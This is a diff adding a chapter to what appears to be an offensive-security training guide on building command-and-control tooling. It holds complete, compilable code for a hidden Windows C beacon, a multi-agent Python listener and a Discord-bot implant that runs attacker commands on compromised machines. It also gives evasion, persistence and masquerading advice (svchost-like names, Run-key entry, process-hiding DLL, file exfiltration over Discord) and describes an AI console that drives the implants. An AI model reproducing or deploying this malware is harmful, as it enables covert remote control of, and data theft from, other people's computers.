@@ -1151,6 +1151,1144 @@ sudo make
 
 ---
 
+## Building a C Beacon from Zero
+
+**WHAT IT IS**: A raw Windows C program that acts as a full beacon. It initialises
+Winsock, connects outbound to your operator machine, sends a JSON heartbeat with
+system information on every cycle, waits to receive a command string, executes it
+via `CreateProcess` with output piped back, sends the output, sleeps with jitter,
+repeats. No libraries. No framework. Pure Win32 API.
+
+**WHY IT MATTERS**: Every C2 framework generates beacons with known signatures.
+If you understand exactly what a beacon does at the socket and Win32 API level, you can
+build one from scratch — one that no signature engine has seen before. CHEYANNE uses
+exactly this approach: `svchost_health.exe` is a compiled C heartbeat beacon running
+against a Discord bot channel. Understanding the primitives means you can port this to
+any transport.
+
+**HOW TO BUILD IT**: The code below is a complete, compilable Windows C beacon. Read
+every comment. It covers WSAStartup, socket connect, JSON serialisation without a
+library, `CreateProcess` with anonymous pipes for output capture, and jitter sleep.
+
+```c
+/*
+ * beacon.c — Minimal C2 beacon for Windows
+ *
+ * COMPILE (MinGW-w64 cross from Linux/WSL2):
+ *   x86_64-w64-mingw32-gcc beacon.c -o beacon.exe -lws2_32 -Wall -O2
+ *
+ * COMPILE (MSYS2 UCRT64 terminal on Windows):
+ *   gcc beacon.c -o beacon.exe -lws2_32 -Wall -O2
+ *
+ * Run your listener first:
+ *   python operator_listener.py
+ * Then execute beacon.exe on the target.
+ *
+ * EXPECTED OUTPUT on operator side:
+ *   [+] New agent: DESKTOP-ABC / george / PID 4321 / Windows 10
+ *   > whoami
+ *   desktop-abc\george
+ */
+
+#include <winsock2.h>   /* WSAStartup, socket, connect, send, recv — link -lws2_32 */
+#include <ws2tcpip.h>   /* inet_pton, getaddrinfo */
+#include <windows.h>    /* CreateProcess, GetComputerNameA, GetUserNameA, ExitProcess */
+#include <stdio.h>      /* sprintf, snprintf */
+#include <string.h>     /* strlen, memset */
+#include <stdlib.h>     /* rand, srand */
+#include <time.h>       /* time — used for srand seed and kill date */
+
+/* ── CONFIG ── change these before compiling ── */
+#define C2_HOST   "127.0.0.1"   /* operator listener IP */
+#define C2_PORT   4444           /* operator listener port */
+#define SLEEP_BASE  30           /* base beacon interval in seconds */
+#define SLEEP_JITTER 40          /* jitter percentage: ±40% of base */
+/* ─────────────────────────────────────────── */
+
+#define BUFSIZE   8192           /* output buffer — 8KB per read chunk */
+
+/*
+ * jitter_sleep — sleep for base seconds ± jitter percent
+ *
+ * Example: base=30, jitter=40
+ *   range  = 30 * 0.40 = 12 seconds
+ *   actual = 30 + rand in [-12, +12]
+ *   result: anywhere from 18s to 42s
+ *
+ * This breaks IDS time-series correlation.
+ * A beacon firing at exactly T+30, T+60, T+90 is trivially flagged.
+ * A beacon firing at T+22, T+41, T+33 looks like background noise.
+ */
+void jitter_sleep(int base_sec, int jitter_pct) {
+    double range = base_sec * (jitter_pct / 100.0);      /* ± window in seconds */
+    double offset = ((double)rand() / RAND_MAX) * 2.0 * range - range; /* [-range, +range] */
+    int actual = (int)(base_sec + offset);
+    if (actual < 1) actual = 1;                          /* floor: never sleep 0 */
+    Sleep(actual * 1000);                                /* Sleep() takes milliseconds */
+}
+
+/*
+ * run_command — execute cmd string via CreateProcess, capture all output
+ *
+ * CreateProcess is the Win32 API for launching processes. We create two
+ * anonymous pipes: one for stdout, one for stderr. The child process writes
+ * to the write-end of each pipe. We read from the read-end after the child exits.
+ *
+ * Returns: heap-allocated string with combined stdout+stderr.
+ *          Caller must free() this.
+ */
+char* run_command(const char* cmd) {
+    SECURITY_ATTRIBUTES sa;
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.lpSecurityDescriptor = NULL;
+    sa.bInheritHandle = TRUE;               /* child inherits pipe handles */
+
+    HANDLE hReadOut,  hWriteOut;            /* stdout pipe: parent reads, child writes */
+    HANDLE hReadErr,  hWriteErr;            /* stderr pipe: parent reads, child writes */
+
+    /* create the stdout pipe */
+    if (!CreatePipe(&hReadOut, &hWriteOut, &sa, 0)) return _strdup("pipe_error");
+
+    /* create the stderr pipe */
+    if (!CreatePipe(&hReadErr, &hWriteErr, &sa, 0)) {
+        CloseHandle(hReadOut); CloseHandle(hWriteOut);
+        return _strdup("pipe_error");
+    }
+
+    /* the parent doesn't need to write to stdout/stderr — mark not inheritable */
+    SetHandleInformation(hReadOut, HANDLE_FLAG_INHERIT, 0);
+    SetHandleInformation(hReadErr, HANDLE_FLAG_INHERIT, 0);
+
+    /* build "cmd.exe /c <command>" string */
+    char full_cmd[1024];
+    snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /c %s", cmd);
+
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    ZeroMemory(&pi, sizeof(pi));
+    si.cb          = sizeof(si);
+    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;               /* hide the console window */
+    si.hStdOutput  = hWriteOut;             /* child stdout → our pipe */
+    si.hStdError   = hWriteErr;             /* child stderr → our pipe */
+
+    /* launch the process */
+    BOOL ok = CreateProcessA(
+        NULL,       /* lpApplicationName: NULL = use lpCommandLine */
+        full_cmd,   /* lpCommandLine: the full "cmd.exe /c whoami" string */
+        NULL,       /* lpProcessAttributes */
+        NULL,       /* lpThreadAttributes */
+        TRUE,       /* bInheritHandles: TRUE so child gets our pipe handles */
+        0,          /* dwCreationFlags */
+        NULL,       /* lpEnvironment: inherit parent's environment */
+        NULL,       /* lpCurrentDirectory: inherit parent's cwd */
+        &si,        /* lpStartupInfo */
+        &pi         /* lpProcessInformation: filled by CreateProcess */
+    );
+
+    /* close the write-ends in the parent — child has its own copy */
+    CloseHandle(hWriteOut);
+    CloseHandle(hWriteErr);
+
+    if (!ok) {
+        CloseHandle(hReadOut); CloseHandle(hReadErr);
+        return _strdup("createprocess_failed");
+    }
+
+    /* wait for the child to finish */
+    WaitForSingleObject(pi.hProcess, 10000); /* 10-second timeout */
+
+    /* collect all output — read stdout first, then stderr */
+    char* result = (char*)malloc(BUFSIZE * 4);
+    if (!result) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return NULL; }
+    result[0] = '\0';
+    int pos = 0;
+
+    DWORD bytes_read;
+    char chunk[BUFSIZE];
+
+    /* drain stdout pipe */
+    while (ReadFile(hReadOut, chunk, BUFSIZE - 1, &bytes_read, NULL) && bytes_read > 0) {
+        chunk[bytes_read] = '\0';
+        strncat(result + pos, chunk, BUFSIZE * 4 - pos - 1);
+        pos += bytes_read;
+    }
+    /* drain stderr pipe */
+    while (ReadFile(hReadErr, chunk, BUFSIZE - 1, &bytes_read, NULL) && bytes_read > 0) {
+        chunk[bytes_read] = '\0';
+        strncat(result + pos, chunk, BUFSIZE * 4 - pos - 1);
+        pos += bytes_read;
+    }
+
+    CloseHandle(hReadOut);
+    CloseHandle(hReadErr);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    if (pos == 0) return _strdup("(no output)");
+    return result;
+}
+
+int main(void) {
+    srand((unsigned int)time(NULL));         /* seed RNG for jitter */
+
+    /* initialise Winsock — required before any socket calls on Windows */
+    WSADATA wsa;
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        /* MAKEWORD(2,2) requests Winsock version 2.2 — the current standard */
+        return 1;
+    }
+
+    /* gather system info — sent in every heartbeat */
+    char hostname[256] = {0};
+    char username[256] = {0};
+    DWORD hlen = sizeof(hostname);
+    DWORD ulen = sizeof(username);
+    GetComputerNameA(hostname, &hlen);       /* fills hostname with NETBIOS name */
+    GetUserNameA(username, &ulen);           /* fills username with current user */
+    DWORD pid = GetCurrentProcessId();       /* our own PID */
+
+    /* beacon loop — runs forever until kill date or network failure */
+    while (1) {
+        /* ── open a fresh TCP socket each cycle ── */
+        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (s == INVALID_SOCKET) {
+            jitter_sleep(SLEEP_BASE, SLEEP_JITTER);
+            continue;                        /* try again next cycle */
+        }
+
+        struct sockaddr_in srv;
+        srv.sin_family = AF_INET;
+        srv.sin_port   = htons(C2_PORT);     /* htons converts host→network byte order */
+        inet_pton(AF_INET, C2_HOST, &srv.sin_addr); /* convert dotted-decimal to binary */
+
+        if (connect(s, (struct sockaddr*)&srv, sizeof(srv)) != 0) {
+            closesocket(s);
+            jitter_sleep(SLEEP_BASE, SLEEP_JITTER);
+            continue;                        /* operator not listening — retry */
+        }
+
+        /* ── send heartbeat JSON ── */
+        /* build minimal JSON manually — no library dependency */
+        char heartbeat[1024];
+        snprintf(heartbeat, sizeof(heartbeat),
+            "{\"hostname\":\"%s\",\"username\":\"%s\",\"pid\":%lu,\"os\":\"Windows\"}\n",
+            hostname, username, (unsigned long)pid);
+
+        send(s, heartbeat, (int)strlen(heartbeat), 0);
+
+        /* ── receive a command (operator types it) ── */
+        char cmd_buf[1024] = {0};
+        int n = recv(s, cmd_buf, sizeof(cmd_buf) - 1, 0);
+
+        if (n > 0) {
+            cmd_buf[n] = '\0';
+
+            /* strip trailing newline/carriage-return from operator input */
+            while (n > 0 && (cmd_buf[n-1] == '\n' || cmd_buf[n-1] == '\r')) {
+                cmd_buf[--n] = '\0';
+            }
+
+            if (strcmp(cmd_buf, "exit") == 0) {
+                /* operator ordered clean disconnect */
+                closesocket(s);
+                break;
+            }
+
+            /* execute the command and get output */
+            char* output = run_command(cmd_buf);
+
+            /* send output back — may be multiple KB */
+            if (output) {
+                send(s, output, (int)strlen(output), 0);
+                free(output);
+            }
+        }
+
+        closesocket(s);                      /* close socket — reconnect next cycle */
+        jitter_sleep(SLEEP_BASE, SLEEP_JITTER);
+    }
+
+    WSACleanup();                            /* release Winsock resources */
+    return 0;
+}
+```
+
+### Compile Commands
+
+```bash
+# From MSYS2 UCRT64 terminal (Windows native):
+gcc beacon.c -o beacon.exe -lws2_32 -Wall -O2
+
+# From WSL2 / Linux (cross-compile for Windows target):
+x86_64-w64-mingw32-gcc beacon.c -o beacon.exe -lws2_32 -Wall -O2
+
+# -lws2_32 : links ws2_32.dll — required for all Winsock functions
+# -Wall     : show all warnings — keep this during development
+# -O2       : optimisation level 2 — smaller, faster binary
+```
+
+### Expected Output
+
+```
+# Operator terminal — Python listener running:
+[*] Listening on 0.0.0.0:4444
+[+] Connection from 192.168.1.50:52341
+[+] HEARTBEAT: {"hostname":"DESKTOP-ABC","username":"george","pid":4321,"os":"Windows"}
+[+] Agent registered: DESKTOP-ABC | george | PID 4321
+
+Agents:
+  [0] DESKTOP-ABC  george  192.168.1.50  PID 4321
+
+Select agent> 0
+Command> whoami
+[*] Sent: whoami
+[*] Output:
+desktop-abc\george
+
+Command> ipconfig
+[*] Sent: ipconfig
+[*] Output:
+Windows IP Configuration
+Ethernet adapter Ethernet:
+   IPv4 Address. . . : 192.168.1.50
+   Subnet Mask . . . : 255.255.255.0
+   Default Gateway . : 192.168.1.1
+```
+
+**Failure: `beacon.exe exits immediately`** — the operator listener is not running.
+Start `operator_listener.py` before running the beacon.
+
+**Failure: `undefined reference to 'WSAStartup'`** — missing `-lws2_32`. Add it.
+
+**Failure: `beacon.c:1:22: fatal error: winsock2.h: No such file`** — wrong compiler.
+Use `x86_64-w64-mingw32-gcc` or the MinGW gcc from MSYS2 UCRT64, not Linux system gcc.
+
+// DRILL: Compile beacon.c. Start the Python operator listener. Run beacon.exe. Send `whoami`. Confirm output arrives. Then modify C2_HOST to a dead IP and watch the beacon retry silently with jitter.
+
+---
+
+## Python Operator Listener
+
+**WHAT IT IS**: An asyncio TCP server running on the operator's machine. Multiple beacons
+connect simultaneously. The operator sees a live agent table (hostname, IP, PID), selects
+a target, types commands, receives output. Full concurrent multi-agent handling.
+
+**WHY IT MATTERS**: The C beacon above connects to whatever is listening on port 4444.
+This is what's listening. It demonstrates the full communication model: beacon-in from
+target, command-out from operator, output-in from target. In CHEYANNE, the equivalent
+is the Discord bot polling a channel — this raw TCP version is architecturally identical,
+just a different transport.
+
+**HOW TO BUILD IT**: The code below is complete. Run it. It handles multiple simultaneous
+connections in an asyncio event loop. No dependencies beyond Python standard library.
+
+```python
+# operator_listener.py — asyncio multi-agent TCP C2 listener
+#
+# RUN:
+#   python operator_listener.py
+#
+# DEPENDENCIES: none (asyncio, json, sys are stdlib)
+#
+# EXPECTED OUTPUT:
+#   [*] Listening on 0.0.0.0:4444
+#   [+] Connection from 192.168.1.50:52341
+#   [+] HEARTBEAT: {"hostname":"DESKTOP-ABC",...}
+
+import asyncio        # async TCP server — handle multiple beacons concurrently
+import json           # parse heartbeat JSON from beacons
+import sys            # sys.stdin for interactive command input
+import threading      # run input() loop in a thread alongside asyncio event loop
+import time           # timestamp for agent table
+
+# ── agent registry ── thread-safe dict of connected agents ──
+# Key: (host, port) tuple
+# Value: dict with hostname, username, pid, writer (asyncio StreamWriter)
+agents = {}
+agents_lock = threading.Lock()
+
+LISTEN_HOST = "0.0.0.0"   # accept connections on all interfaces
+LISTEN_PORT = 4444         # must match C2_PORT in beacon.c
+
+
+def print_agents():
+    """Print the current agent table to the operator."""
+    with agents_lock:
+        if not agents:
+            print("[!] No active agents.")
+            return
+        print("\n  ID  HOSTNAME          USER        IP              PID")
+        print("  " + "-" * 58)
+        for idx, (addr, info) in enumerate(agents.items()):
+            print(f"  [{idx}] {info['hostname']:<16}  {info['username']:<10}  "
+                  f"{addr[0]:<14}  {info['pid']}")
+        print()
+
+
+async def handle_beacon(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
+    """
+    Called once per incoming beacon connection.
+    Runs concurrently for every connected agent.
+
+    Protocol:
+      1. Read first line — JSON heartbeat from beacon
+      2. Register agent in global dict
+      3. Wait for operator to send a command via the command_queue
+      4. Send command to beacon
+      5. Read output lines until beacon closes connection
+      6. Print output, deregister agent
+    """
+    addr = writer.get_extra_info('peername')   # (ip, port) tuple
+    print(f"\n[+] Connection from {addr[0]}:{addr[1]}")
+
+    # ── step 1: read heartbeat JSON ──
+    try:
+        line = await asyncio.wait_for(reader.readline(), timeout=10.0)
+    except asyncio.TimeoutError:
+        writer.close()
+        return
+
+    raw = line.decode(errors='replace').strip()
+    print(f"[+] HEARTBEAT: {raw}")
+
+    try:
+        info = json.loads(raw)
+    except json.JSONDecodeError:
+        print(f"[!] Bad JSON from {addr[0]}")
+        writer.close()
+        return
+
+    # ── step 2: register agent ──
+    info['addr']  = addr
+    info['writer'] = writer
+    info['queue']  = asyncio.Queue()   # operator puts commands here
+
+    with agents_lock:
+        agents[addr] = info
+
+    print(f"[+] Agent registered: {info.get('hostname','?')} | "
+          f"{info.get('username','?')} | PID {info.get('pid','?')}")
+    print_agents()
+
+    # ── step 3-5: wait for commands from operator, relay output ──
+    try:
+        while True:
+            # block until operator puts a command in this agent's queue
+            cmd = await info['queue'].get()
+
+            if cmd == "__disconnect__":
+                break
+
+            # send command to beacon
+            writer.write((cmd + "\n").encode())
+            await writer.drain()
+
+            # read output until connection closes or timeout
+            output_chunks = []
+            try:
+                while True:
+                    chunk = await asyncio.wait_for(
+                        reader.read(4096), timeout=8.0
+                    )
+                    if not chunk:
+                        break                 # beacon closed connection
+                    output_chunks.append(chunk.decode(errors='replace'))
+            except asyncio.TimeoutError:
+                pass                          # no more data — output complete
+
+            output = "".join(output_chunks)
+            print(f"\n[*] Output:\n{output}")
+
+    except (ConnectionResetError, asyncio.IncompleteReadError):
+        pass
+
+    # ── step 6: deregister ──
+    with agents_lock:
+        agents.pop(addr, None)
+
+    writer.close()
+    print(f"[-] Agent disconnected: {addr[0]}")
+
+
+def operator_input_loop(loop: asyncio.AbstractEventLoop):
+    """
+    Runs in a separate thread. Reads commands from stdin.
+    The asyncio event loop is running in the main thread;
+    this thread submits coroutines to it via run_coroutine_threadsafe.
+
+    Two-step interaction:
+      1. operator selects agent by index
+      2. operator types commands for that agent
+    """
+    print("[*] Operator console ready. Type 'agents' to list, or select an agent by index.")
+
+    while True:
+        try:
+            raw = input("Select agent (index) or 'agents'> ").strip()
+        except EOFError:
+            break
+
+        if raw == "agents":
+            print_agents()
+            continue
+
+        try:
+            idx = int(raw)
+        except ValueError:
+            print("[!] Enter a number (agent index) or 'agents'")
+            continue
+
+        # get the agent at this index
+        with agents_lock:
+            agent_list = list(agents.values())
+
+        if idx >= len(agent_list) or idx < 0:
+            print(f"[!] No agent at index {idx}")
+            continue
+
+        agent = agent_list[idx]
+        hostname = agent.get('hostname', '?')
+        queue = agent['queue']
+
+        print(f"[*] Selected: {hostname}. Type commands. 'back' to deselect, 'exit' to disconnect agent.")
+
+        while True:
+            try:
+                cmd = input(f"{hostname}> ").strip()
+            except EOFError:
+                break
+
+            if cmd == "back":
+                break
+
+            if cmd == "exit":
+                # send disconnect sentinel
+                asyncio.run_coroutine_threadsafe(
+                    queue.put("__disconnect__"), loop
+                )
+                break
+
+            if not cmd:
+                continue
+
+            # put command in agent's queue — handle_beacon will pick it up
+            asyncio.run_coroutine_threadsafe(
+                queue.put(cmd), loop
+            )
+
+            # small delay to let output print before next prompt
+            time.sleep(0.5)
+
+
+async def main():
+    """Start the TCP listener and launch the operator input thread."""
+    server = await asyncio.start_server(
+        handle_beacon, LISTEN_HOST, LISTEN_PORT
+    )
+    print(f"[*] Listening on {LISTEN_HOST}:{LISTEN_PORT}")
+
+    # start operator input in a background thread
+    # (input() is blocking — can't run in async event loop directly)
+    loop = asyncio.get_event_loop()
+    t = threading.Thread(target=operator_input_loop, args=(loop,), daemon=True)
+    t.start()
+
+    async with server:
+        await server.serve_forever()
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
+```
+
+### Expected Output
+
+```
+# Terminal 1 — start listener:
+python operator_listener.py
+[*] Listening on 0.0.0.0:4444
+[*] Operator console ready. Type 'agents' to list, or select an agent by index.
+
+# Terminal 2 — run beacon:
+beacon.exe
+
+# Back in Terminal 1 — beacon connects:
+[+] Connection from 127.0.0.1:52341
+[+] HEARTBEAT: {"hostname":"DESKTOP-ABC","username":"george","pid":4321,"os":"Windows"}
+[+] Agent registered: DESKTOP-ABC | george | PID 4321
+
+  ID  HOSTNAME          USER        IP              PID
+  ----------------------------------------------------------
+  [0] DESKTOP-ABC       george      127.0.0.1       4321
+
+Select agent (index) or 'agents'> 0
+[*] Selected: DESKTOP-ABC. Type commands. 'back' to deselect.
+DESKTOP-ABC> whoami
+[*] Output:
+desktop-abc\george
+
+DESKTOP-ABC> net user
+[*] Output:
+User accounts for \\DESKTOP-ABC
+george   Administrator   DefaultAccount   Guest
+```
+
+// DRILL: Run the listener. Run the beacon. Send three different commands. Observe the jitter in beacon reconnection timing. Kill the listener, watch the beacon retry silently.
+
+---
+
+## Discord as a Covert C2 Channel
+
+**WHAT IT IS**: A Python bot that polls a private Discord channel for command messages,
+executes them locally via `subprocess`, and posts output back to the channel. The operator
+types commands into Discord. The implant on the target machine sees them and responds.
+
+**WHY IT MATTERS**: Discord traffic looks exactly like any other user's Discord usage.
+It runs over TLS on port 443. Discord's CDN is hosted by Cloudflare — a trusted,
+categorised domain that almost no corporate proxy blocks. An analyst looking at outbound
+connections from a workstation will see `discord.com` and `cdn.discordapp.com` — normal.
+They will not see your C2 traffic.
+
+Specific reasons Discord bypasses most defences:
+1. **TLS on port 443** — all traffic encrypted, content invisible to DPI
+2. **Legitimate CDN** — `discord.com` is pre-categorised as "Social Networking" or
+   "Messaging" in every major proxy (Zscaler, Palo Alto, Cisco Umbrella)
+3. **Domain age** — Discord's domain is years old, zero threat intel hits
+4. **No dedicated port** — no unusual port to block, no port 4444 in firewall logs
+5. **Websocket keep-alive** — the bot maintains a persistent websocket, no
+   visible polling pattern (unlike raw TCP which reconnects every beacon cycle)
+
+**HOW TO BUILD IT**: You need a Discord bot token and a private guild (server).
+Create the bot at https://discord.com/developers/applications. Add it to a private
+server. Get the target channel ID. The code below runs on the compromised machine.
+
+```
+# Install dependency — discord.py (do this once on operator machine and implant):
+pip install discord.py
+```
+
+```python
+# discord_beacon.py — Discord-channel C2 implant
+#
+# RUN ON TARGET:
+#   pip install discord.py
+#   python discord_beacon.py
+#
+# OPERATOR:
+#   Open Discord → go to your private C2 channel
+#   Type: !cmd whoami
+#   Bot responds with output in same channel
+#
+# SECURITY NOTE:
+#   Prefix commands with a unique token so the bot ignores unrelated messages.
+#   Example prefix: !c2x7q_ — something no human would type accidentally.
+
+import discord          # discord.py — handles bot auth, event loop, channel API
+import subprocess       # run commands locally on the compromised machine
+import platform         # get OS info for check-in message
+import os               # getenv for token, getpid for beacon ID
+import socket           # gethostname, gethostbyname for IP
+
+# ── CONFIG — set these before deploying ──
+BOT_TOKEN   = "YOUR_BOT_TOKEN_HERE"       # from discord.com/developers/applications
+CHANNEL_ID  = 1234567890123456789         # right-click channel → Copy ID (developer mode on)
+CMD_PREFIX  = "!cmd"                      # operator must start commands with this prefix
+# ─────────────────────────────────────────
+
+# discord.Intents controls what events the bot receives
+# message_content is required to read message text (privileged intent — enable in portal)
+intents = discord.Intents.default()
+intents.message_content = True
+
+client = discord.Client(intents=intents)
+
+
+@client.event
+async def on_ready():
+    """
+    Fires once when the bot successfully connects to Discord.
+    Sends a check-in message to the C2 channel with host info.
+    """
+    hostname = socket.gethostname()
+    try:
+        ip = socket.gethostbyname(hostname)
+    except Exception:
+        ip = "unknown"
+
+    checkin_msg = (
+        f"**[BEACON ONLINE]**\n"
+        f"Host: `{hostname}`\n"
+        f"IP: `{ip}`\n"
+        f"OS: `{platform.platform()}`\n"
+        f"PID: `{os.getpid()}`\n"
+        f"User: `{os.getenv('USERNAME', os.getenv('USER', 'unknown'))}`\n"
+        f"Awaiting commands with prefix `{CMD_PREFIX}`"
+    )
+
+    channel = client.get_channel(CHANNEL_ID)
+    if channel:
+        await channel.send(checkin_msg)      # post check-in to C2 channel
+
+
+@client.event
+async def on_message(message: discord.Message):
+    """
+    Fires for every message in every channel the bot can see.
+    Filter: only process messages in our C2 channel with the right prefix.
+    The bot ignores its own messages to prevent feedback loops.
+    """
+
+    # ignore the bot's own messages — otherwise we'd loop on our own output
+    if message.author == client.user:
+        return
+
+    # only process messages in the designated C2 channel
+    if message.channel.id != CHANNEL_ID:
+        return
+
+    # only process messages that start with our command prefix
+    if not message.content.startswith(CMD_PREFIX):
+        return
+
+    # extract the actual command — everything after the prefix and a space
+    cmd = message.content[len(CMD_PREFIX):].strip()
+
+    if not cmd:
+        await message.channel.send("Empty command.")
+        return
+
+    # ── execute the command via subprocess ──
+    # shell=True so we can run cmd.exe built-ins like 'dir', 'set', etc.
+    # timeout=30 prevents operator from accidentally hanging the implant
+    try:
+        result = subprocess.run(
+            cmd,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=30
+        )
+        output = result.stdout + result.stderr
+    except subprocess.TimeoutExpired:
+        output = "[TIMEOUT] Command exceeded 30 seconds."
+    except Exception as e:
+        output = f"[ERROR] {str(e)}"
+
+    if not output:
+        output = "(no output)"
+
+    # Discord message limit is 2000 chars — split if needed
+    # Wrap in code block for readability
+    max_chunk = 1900                         # leave room for code fences
+    chunks = [output[i:i+max_chunk] for i in range(0, len(output), max_chunk)]
+
+    for chunk in chunks:
+        await message.channel.send(f"```\n{chunk}\n```")
+
+
+# run the bot — this blocks indefinitely (keeps polling Discord's websocket)
+client.run(BOT_TOKEN)
+```
+
+### Operator Workflow
+
+```
+Discord private channel — C2 comms:
+
+[BOT] **[BEACON ONLINE]**
+      Host: DESKTOP-ABC
+      IP: 192.168.1.50
+      OS: Windows-10-10.0.22621
+      PID: 4321
+      User: george
+      Awaiting commands with prefix !cmd
+
+[OPERATOR] !cmd whoami
+[BOT] ```
+      desktop-abc\george
+      ```
+
+[OPERATOR] !cmd net localgroup administrators
+[BOT] ```
+      Alias name     administrators
+      Members: Administrator, george
+      ```
+
+[OPERATOR] !cmd systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+[BOT] ```
+      OS Name: Microsoft Windows 10 Pro
+      OS Version: 10.0.22621 N/A Build 22621
+      ```
+```
+
+### Why Discord Evades Network Defenders
+
+```
+NETWORK DEFENDER VIEW — what they see:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Proxy logs:
+  CONNECT discord.com:443       ← categorised "Social Networking" — allowed
+  CONNECT cdn.discordapp.com    ← categorised "Content Delivery" — allowed
+  CONNECT gateway.discord.gg    ← Discord websocket gateway — allowed
+
+NetFlow:
+  192.168.1.50:RANDOM → 162.159.x.x:443    (Cloudflare IP for discord.com)
+  Long-lived connection (Discord websocket stays open for hours)
+  ← looks identical to a user with Discord open in the background
+
+Packet capture (DPI):
+  All TLS. Content encrypted. No signature to match.
+
+JA3:
+  discord.py uses Python's ssl module → matches standard Python TLS fingerprint
+  No known-bad JA3 signatures
+
+WHAT DOESN'T BLEND:
+  - Discord traffic at 3AM when no employees are at work
+  - Discord running on a server (workstations use Discord, not servers)
+  - Unusual accounts (bot tokens have no profile picture, age, etc.)
+  - Output volume: large command outputs mean large uploads to Discord
+    (a systeminfo dump is 4KB — unusual for a "chat" message)
+```
+
+// DRILL: Create a test Discord server. Create a bot. Paste your token and channel ID. Run discord_beacon.py on your local machine. Send !cmd whoami from your phone via Discord mobile. Confirm output arrives. Then capture traffic in Wireshark — confirm it's all TLS to discord.com.
+
+---
+
+## CHEYANNE Architecture
+
+**WHAT IT IS**: A multi-layer C2 architecture built by 22DIV for controlled research
+and authorised engagements. The architecture uses multiple communication channels
+in a hierarchy: a C beacon for heartbeat, a Python implant for interactive commands,
+and a Discord bridge for covert operator communication.
+
+**WHY IT MATTERS**: No single channel is relied upon. If the Discord bot is blocked,
+the TCP listener catches the heartbeat. If TCP is filtered, Discord still works.
+Layered infrastructure means losing one channel does not lose the operation.
+
+```
+CHEYANNE ARCHITECTURE — FULL KILL CHAIN:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+                         ┌─────────────────────────────┐
+                         │   OPERATOR MACHINE (22DIV)  │
+                         │   192.168.1.92               │
+                         │                             │
+                         │   ┌─────────────────────┐  │
+                         │   │  cheyanne_agent.py  │  │
+                         │   │  (AI operator UI)   │  │
+                         │   │  Ollama / Claude     │  │
+                         │   └────────┬────────────┘  │
+                         │            │                │
+                         │   ┌────────▼────────────┐  │
+                         │   │  operator_listener  │  │
+                         │   │  TCP :4443           │  │
+                         │   └────────┬────────────┘  │
+                         └────────────│────────────────┘
+                                      │
+                         CHANNEL 1: TCP reverse shell (port 4443)
+                         ← direct, fast, noisy, for interactive ops
+                                      │
+             ╔════════════════════════▼═══════════════════════════╗
+             ║          NETWORK BOUNDARY / INTERNET                ║
+             ║      (or LAN segment — same principle)              ║
+             ╚════════════════════════╤═══════════════════════════╝
+                                      │
+                         CHANNEL 2: Discord (port 443, TLS, CDN)
+                         ← covert, survives proxy, async, operator
+                         ← uses discord.com — pre-categorised, trusted
+                                      │
+                         ┌────────────▼────────────────────────────┐
+                         │   TARGET MACHINE                        │
+                         │   Radon_Laptop1 / 192.168.1.145        │
+                         │                                        │
+                         │   ┌──────────────────────────────┐    │
+                         │   │  svchost_health.exe  (C)     │    │
+                         │   │  Heartbeat-only beacon        │    │
+                         │   │  TCP connect → :4443 every 60s│   │
+                         │   │  Registered: HKCU\Run         │    │
+                         │   └──────────────────────────────┘    │
+                         │                                        │
+                         │   ┌──────────────────────────────┐    │
+                         │   │  svchost_update.exe  (Python) │    │
+                         │   │  Full interactive implant     │    │
+                         │   │  Commands: SCREENSHOT, UPLOAD, │   │
+                         │   │  DOWNLOAD, RECON, shell cmds  │    │
+                         │   │  Transport: Discord bot API   │    │
+                         │   └──────────────────────────────┘    │
+                         │                                        │
+                         │   ┌──────────────────────────────┐    │
+                         │   │  Cloak DLL (CBT hook)        │    │
+                         │   │  Hides process names and     │    │
+                         │   │  ports from GUI apps          │    │
+                         │   └──────────────────────────────┘    │
+                         └────────────────────────────────────────┘
+
+WHAT EACH HOP HIDES FROM DEFENDERS:
+
+  TCP beacon (svchost_health.exe):
+    → hides behind a svchost-style process name
+    → connects to internal operator IP — no external traffic if both on LAN
+    → Cloak DLL hides it from Task Manager, netstat GUI
+
+  Discord implant (svchost_update.exe):
+    → all traffic to discord.com — trusted domain, categorised, TLS
+    → operator never needs to expose a listening port externally
+    → commands appear as chat messages — no C2 protocol fingerprint
+    → file exfil via Discord attachment upload (<8MB) — looks like sharing files
+
+  cheyanne_agent.py (AI operator console):
+    → operator talks to an AI that translates intent to implant commands
+    → AI knows CHEYANNE API (get_sessions, send_command, poll_output)
+    → reduces operator skill floor — describe the goal, AI picks the tool
+
+PERSISTENCE MECHANISM:
+  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  Key: WindowsSecurityHealth
+  Value: C:\Users\george\AppData\Local\Temp\svchost_health.exe
+  → runs on every user login, no admin required
+  → blends with legitimate Windows health service names
+```
+
+### Hop-by-Hop Analysis
+
+**Hop 1 — Target to Discord**: `svchost_update.exe` authenticates to Discord using a bot
+token, joins the operator's private guild, and polls the C2 channel using Discord's
+gateway websocket. Every message appears as a legitimate Discord chat message. The only
+network traffic the target generates is HTTPS to `gateway.discord.gg` — indistinguishable
+from a human using Discord.
+
+**Hop 2 — Discord to Operator**: The operator types commands directly into a Discord channel
+from any device — phone, browser, desktop. No VPN required. No exposed listener port.
+Discord acts as the message broker. Commands persist in the channel even if the operator
+disconnects.
+
+**Hop 3 — Operator Console to AI**: `cheyanne_agent.py` wraps the implant API in an AI
+conversation. The operator describes what they want ("take a screenshot and browse the
+desktop") and the AI calls `screenshot()` then `browse_files("C:\\Users\\Ghaleb\\Desktop")`.
+This is CHEYANNE in the 22DIV configuration: Discord-channel C2 with AI-assisted operation.
+
